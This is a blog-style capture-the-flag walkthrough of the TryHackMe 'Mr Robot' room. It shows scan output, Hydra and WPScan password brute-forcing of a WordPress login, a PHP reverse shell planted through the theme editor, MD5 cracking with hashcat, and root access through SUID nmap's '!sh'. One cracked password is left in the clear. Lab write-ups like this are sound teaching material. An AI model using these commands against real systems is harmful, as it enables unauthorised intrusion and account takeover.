---
title: "Mr Robot"
date: 2022-09-18T18:33:31+01:00
draft: false
categories:
  - Tryhackme
---

# [Mr Robot ctf](https://tryhackme.com/room/mrrobot)

difficulty: Medium

{{< post-img src="robot.jpeg" alt="robot" style="width: 200px;" >}}

Hello friend!

## Enumeration

```bash
PORT    STATE SERVICE  REASON  VERSION
80/tcp  open  http     syn-ack Apache httpd
|_http-server-header: Apache
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http syn-ack Apache httpd
|_http-server-header: Apache
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=www.example.com
| Issuer: commonName=www.example.com
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2015-09-16T10:45:03
| Not valid after:  2025-09-13T10:45:03
| MD5:   3c16 3b19 87c3 42ad 6634 c1c9 d0aa fb97
| SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b
| -----BEGIN CERTIFICATE-----
| MIIBqzCCARQCCQCgSfELirADCzANBgkqhkiG9w0BAQUFADAaMRgwFgYDVQQDDA93
| d3cuZXhhbXBsZS5jb20wHhcNMTUwOTE2MTA0NTAzWhcNMjUwOTEzMTA0NTAzWjAa
| MRgwFgYDVQQDDA93d3cuZXhhbXBsZS5jb20wgZ8wDQYJKoZIhvcNAQEBBQADgY0A
| MIGJAoGBANlxG/38e8Dy/mxwZzBboYF64tu1n8c2zsWOw8FFU0azQFxv7RPKcGwt
| sALkdAMkNcWS7J930xGamdCZPdoRY4hhfesLIshZxpyk6NoYBkmtx+GfwrrLh6mU
| yvsyno29GAlqYWfffzXRoibdDtGTn9NeMqXobVTTKTaR0BGspOS5AgMBAAEwDQYJ
| KoZIhvcNAQEFBQADgYEASfG0dH3x4/XaN6IWwaKo8XeRStjYTy/uBJEBUERlP17X
| 1TooZOYbvgFAqK8DPOl7EkzASVeu0mS5orfptWjOZ/UWVZujSNj7uu7QR4vbNERx
| ncZrydr7FklpkIN5Bj8SYc94JI9GsrHip4mpbystXkxncoOVESjRBES/iatbkl0=
|_-----END CERTIFICATE-----

```

```bash
---- Scanning URL: http://10.10.82.148/ ----
==> DIRECTORY: http://10.10.82.148/0/
==> DIRECTORY: http://10.10.82.148/admin/
==> DIRECTORY: http://10.10.82.148/blog/
==> DIRECTORY: http://10.10.82.148/css/
==> DIRECTORY: http://10.10.82.148/images/
+ http://10.10.82.148/intro (CODE:200|SIZE:516314)
==> DIRECTORY: http://10.10.82.148/js/
+ http://10.10.82.148/login (CODE:302|SIZE:0)
+ http://10.10.82.148/phpmyadmin (CODE:403|SIZE:94)
+ http://10.10.82.148/readme (CODE:200 SIZE:64)
+ http://10.10.82.148/rss (CODE:301|SIZE:0)
+ http://10.10.82.148/sitemap (CODE:200|SIZE:0)
+ http://10.10.82.148/xmlrpc (CODE:405|SIZE:42)
```
The dir discovery was very slow with `gobuster` and `ffuf` for some reason...

Anyway...Cool website!
Lets visit `robots.txt`
(lmao, robots...got it?)

```text
User-agent: *
fsocity.dic
key-1-of-3.txt
```
Now we got the first key at:

```text
http://10.10.82.148/key-1-of-3.txt

```
There are some funny stuff in other directories but the next useful thing here is `fsocity.dic`
we download it and as expected its a dictionary (expect bruteforce)
I thought It would be used at `admin` but this page is a redirect loop...when visiting `/0` I noticed there is a `wordpress blog` so I tried `wp-admin` instead

Bingo! Bruteforce time! Fire up Hydra!
As the message error is different from password error we can bruteforce both with hydra
For the username

```bash
hydra -L /home/nair0lf32/Desktop/Stuff/THM/mrRobot/fsocity.dic -p test 10.10.82.148  http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username" -V

[ATTEMPT] target 10.10.82.148 - login "net" - pass "test" - 30 of 858235 [child 13] (0/0)
[80][http-post-form] host: 10.10.82.148   login: Elliot   password: test
[ATTEMPT] target 10.10.82.148 - login "push" - pass "test" - 31 of 858235 [child 14] (0/0)
[ATTEMPT] target 10.10.82.148 - login "category" - pass "test" - 32 of 858235 [child 15] (0/0)
[ATTEMPT] target 10.10.82.148 - login "Alderson" - pass "test" - 33 of 858235 [child 2] (0/0)

...
```

`username = Elliot` (this one is on me)

Then the password

It was taking mad long so I reduced the dictonnary

SORTING AND REMOVING DUPLICATES from your bruteforce dictionaries:

`sort fsocity.dic | uniq > fsocity-sorted.dic`

OR:

`cat fsocity.dic | sort -u | uniq > wordlist.dic`

Then

```bash
hydra -l Elliot -P /home/nair0lf32/Desktop/Stuff/THM/mrRobot/fsocity.dic 10.10.82.148  http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username" -V -t 30


[ATTEMPT] target 10.10.245.102 - login "Elliot" - pass "experiencing" - 356 of 6077 [child 54] (0/0)
[ATTEMPT] target 10.10.245.102 - login "Elliot" - pass "experiment" - 357 of 6077 [child 52] (0/0)
[ATTEMPT] target 10.10.245.102 - login "Elliot" - pass "experimental" - 358 of 6077 [child 57] (0/0)
[ATTEMPT] target 10.10.245.102 - login "Elliot" - pass "experince" - 359 of 6077 [child 58] (0/0)
[80][http-post-form] host: 10.10.245.102   login: Elliot   password: [REDACTED]
1 of 1 target successfully completed, 1 valid password found
```

Alternatively you can bruteforce for password with wp-scan:
wpscan --url 10.10.245.102 --wp-content-dir wp-admin --usernames elliot --passwords /home/nair0lf32/Desktop/Stuff/THM/mrRobot/fsocity-sorted.dic

```bash
...

[+] Performing password attack on Xmlrpc Multicall against 1 user/s
[SUCCESS] - elliot / [REDACTED]
All Found
Progress Time: 00:02:02 <================================================================================================                                                                                  > (12 / 22) 54.54%  ETA: ??:??:??

[!] Valid Combinations Found:
| Username: elliot, Password: [REDACTED]

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Oct 24 22:06:22 2021
[+] Requests Done: 206
[+] Cached Requests: 6
[+] Data Sent: 50.97 KB
[+] Data Received: 18.609 MB
[+] Memory used: 245.754 MB
[+] Elapsed time: 00:02:21
```
Burpsuite could be used too but slow for community edition

(I didnt try this one)

So In conclusion the creds are:

`Elliot:[REDACTED]`

Login with those And get to the admin dashboard!

## Exploitation

Now getting access is classic stuff
In appearance editor just edit or add a page with a `php reverse shell`

(404.php by example)

And get access on your netcat listener

```bash
$ cd /home/robot
$ ls -la
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
$ cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied
```
yeah its a medium room...what did we expect?

`password.raw-md5` looks promising

```bash
$ cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

Its an easy-to crack hash so use john or hashcat...I prefer the second one for hashes

```bash
└──╼ $hashcat -m 0 'c3fcd3d76192e4007dfb496cca67e13b' /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

...

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

c3fcd3d76192e4007dfb496cca67e13b:[REDACTED]

Session..........: hashcat
Status...........: Cracked
Hash.Name........: MD5
Hash.Target......: c3fcd3d76192e4007dfb496cca67e13b
Time.Started.....: Wed Jan 19 18:20:26 2022 (2 secs)
Time.Estimated...: Wed Jan 19 18:20:28 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    89644 H/s (0.52ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 40960/14344385 (0.29%)
Rejected.........: 0/40960 (0.00%)
Restore.Point....: 38912/14344385 (0.27%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: treetree -> loserface1
```
I think even crackstation could find it!

`robot:[REDACTED]`

Now switch to robot and get that 2nd key

```bash
$ su robot
su: must be run from a terminal
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
daemon@linux:/home/robot$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:~$
robot@linux:~$ id
id
uid=1002(robot) gid=1002(robot) groups=1002(robot)
cat key-2-of-3.txt
...
```

## privilege escalation

First step failed

```bash
robot@linux:~$ sudo -l
sudo -l
[sudo] password for robot: [REDACTED]

Sorry, user robot may not run sudo on linux
```
Second step great success

```bash
find / -perm -u=s -type f 2>/dev/null

/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown

```
GTFObins say nmap is suspicious and therefore...

```bash
robot@linux:~$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
# id
id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
```
Grab the last key

```bash
# cd /root
cd /root
# ls -al
ls -al
total 32
drwx------  3 root root 4096 Nov 13  2015 .
drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
-rw-------  1 root root 4058 Nov 14  2015 .bash_history
-rw-r--r--  1 root root 3274 Sep 16  2015 .bashrc
drwx------  2 root root 4096 Nov 13  2015 .cache
-rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done
-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
-rw-------  1 root root 1024 Sep 16  2015 .rnd
# cat key-3-of-3.txt
cat key-3-of-3.txt
...
```
Incredible room! Now for the culture, do this:

```bash
echo "leave me here!" > readme.txt
```
Goodbye friend!
